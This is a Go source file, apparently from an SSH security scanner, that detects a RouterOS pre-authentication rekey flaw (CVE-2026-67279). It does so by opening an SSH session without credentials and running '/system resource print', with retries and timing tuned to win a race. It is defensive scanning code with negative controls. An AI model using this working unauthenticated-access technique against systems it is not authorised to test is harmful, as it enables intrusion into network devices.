package cmd

import (
	"fmt"
	"net"
	"regexp"
	"strings"
	"time"

	"github.com/runZeroInc/excrypto/x/crypto/ssh"
	"github.com/runZeroInc/sshamble/auth"
)

const checkVulnMikrotikPreauthRekey = "vuln-mikrotik-preauth-rekey"

// CVE-2026-67279 (MikroTrick): RouterOS SSH loses track of the incomplete
// userauth state when the client requests a key re-exchange before
// authenticating, and then accepts connection-protocol messages anyway. An
// unauthenticated client can open a session channel (and dispatch exec
// requests) without any credentials. Fixed in 7.24.2 / 7.23.4 / 6.49.21.
//
// This check needs no credentials and no victim key material: it presents
// 'none' authentication (which RouterOS rejects, leaving the username pending
// in an incomplete userauth state), requests a rekey, and then tries to open
// a session channel. A patched server (and any sane sshd) refuses the channel;
// a vulnerable RouterOS accepts it.
//
// https://cert.pl/en/posts/2026/09/vulnerabilities-in-mikrotik-routeros-actively-exploited/

func sshCheckVulnMikrotikPreauthRekey(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
	tname := checkVulnMikrotikPreauthRekey
	if !conf.IsCheckEnabled(tname) {
		return nil
	}

	conf.Logger.Debugf("%s %s is running", addr, tname)

	run := func(rekey bool) *auth.AuthResult {
		o := options.
			WithIgnoreAuthError().
			WithSessionHandler(func(c net.Conn, sclient *ssh.Client, ses *ssh.Session, r *auth.AuthResult) error {
				_ = c.SetDeadline(time.Now().Add(time.Second * 15))
				out, err := ses.CombinedOutput("/system resource print")
				r.SessionOutput = auth.CleanSessionOutput([]byte(out))
				r.ExitStatus = ""
				if err != nil {
					if ee, ok := err.(*ssh.ExitError); ok {
						r.ExitStatus = fmt.Sprintf("%d", ee.ExitStatus())
						return nil
					}
					return err
				}
				return nil
			})
		if rekey {
			// Trigger a client-requested rekey while the rejected "none" auth
			// leaves the username pending (incomplete userauth state).
			o = o.WithPostAuthHandler(func(c net.Conn, uac *ssh.UnauthClientConn, r *auth.AuthResult) error {
				return mikrotikRequestRekey(addr, conf, tname, uac)
			})
		}
		// ssh.None() is rejected as expected; IgnoreAuthError keeps the
		// connection open so the rekey + channel open follow.
		return auth.SSHAuth(addr, o, auth.SSHAuthHandlerSingle(ssh.None()))
	}

	// The rekey/channel-open ordering is racy, so retry the positive probe a
	// few times before concluding the server is not vulnerable.
	var res *auth.AuthResult
	for attempt := 1; attempt <= 3; attempt++ {
		res = run(true)
		if res.Stage == "session" {
			break
		}
		conf.Logger.Debugf("%s %s attempt %d did not open a pre-auth session after rekey (stage %s): %v", addr, tname, attempt, res.Stage, res.Error)
		time.Sleep(time.Second)
	}
	if res.Stage != "session" {
		conf.Logger.Debugf("%s %s did not open a pre-auth session after rekey: %v", addr, tname, res.Error)
		return nil
	}

	// Negative control: without the rekey, the same pre-auth channel open must
	// be refused. If it also succeeds, the server accepts pre-auth sessions
	// generally (a different defect, e.g. vuln-exec-skip-userauth), and we
	// must not attribute it to CVE-2026-67279.
	if ctrl := run(false); ctrl.Stage == "session" {
		conf.Logger.Warnf("%s %s control (no rekey) also opened a pre-auth session; not reporting CVE-2026-67279", addr, tname)
		return nil
	}

	// Attribute to RouterOS before naming the CVE: either the server banner
	// (SSH-2.0-ROSSSH) or the proof command output must look like RouterOS.
	if !mikrotikPreauthRekeyIsRouterOS(res.Version, res.SessionOutput) {
		conf.Logger.Warnf("%s %s opened a session WITHOUT authentication after a pre-auth rekey, but the service (%q) does not look like RouterOS; not reporting CVE-2026-67279", addr, tname, res.Version)
		return nil
	}

	version := mikrotikParseRouterOSVersion(res.SessionOutput)
	conf.Logger.Warnf("%s %s opened a session WITHOUT authentication via pre-auth rekey", addr, tname)
	if version != "" {
		conf.Logger.Infof("%s %s RouterOS version: %s", addr, tname, version)
	}

	proof := fmt.Sprintf("CVE-2026-67279: session channel opened without authentication after a client-requested pre-auth rekey (server: %s; control without rekey was refused)", res.Version)
	if version != "" {
		proof += fmt.Sprintf(". RouterOS version: %s", version)
	}
	if res.SessionOutput != "" {
		proof += fmt.Sprintf(". /system resource print: %s", res.SessionOutput)
	}

	root.AddVuln(auth.VulnResult{
		ID:    tname,
		Ref:   "https://cert.pl/en/posts/2026/09/vulnerabilities-in-mikrotik-routeros-actively-exploited/",
		Proof: proof,
	})

	// Report the CVE but do not claim a usable session: the channel open alone
	// (CVE-2026-67279) yields no console, so interacting via this method would
	// fail and, worse, would short-circuit the scan before the fd-2 injection
	// check (CVE-2026-86060) can obtain the actual admin console.
	res.SessionMethod = ""
	root.SessionOutput = res.SessionOutput

	return res
}

// mikrotikPreauthRekeyIsRouterOS reports whether the server banner or the
// proof command output identifies the target as MikroTik RouterOS.
func mikrotikPreauthRekeyIsRouterOS(serverVersion string, output string) bool {
	return strings.Contains(serverVersion, "ROSSSH") || strings.Contains(output, "MikroTik")
}

var mikrotikVersionPattern = regexp.MustCompile(`version:\s*(\S+)`)

// mikrotikParseRouterOSVersion extracts the version string from the output of
// "/system resource print" ("version: 7.24.1 (stable)"), or "" if absent.
func mikrotikParseRouterOSVersion(output string) string {
	m := mikrotikVersionPattern.FindStringSubmatch(output)
	if m == nil {
		return ""
	}
	return m[1]
}

// mikrotikRequestRekey triggers a client-requested rekey and waits briefly for
// the transport's kex goroutine to send KEXINIT. The wait ensures the channel
// open that follows is queued during the rekey (or written after it completes)
// rather than racing ahead of it; if the channel open is written first, the
// still-authenticated server rejects it before the rekey can reset its userauth
// state, which is the intermittent "ssh: disconnect, reason 2" failure mode.
func mikrotikRequestRekey(addr string, conf *ScanConfig, tname string, uac *ssh.UnauthClientConn) error {
	if err := uac.RequestKeyExchange(); err != nil {
		conf.Logger.Debugf("%s %s rekey request failed: %v", addr, tname, err)
		return err
	}
	time.Sleep(100 * time.Millisecond)
	conf.Logger.Tracef("%s %s pre-auth rekey requested", addr, tname)
	return nil
}
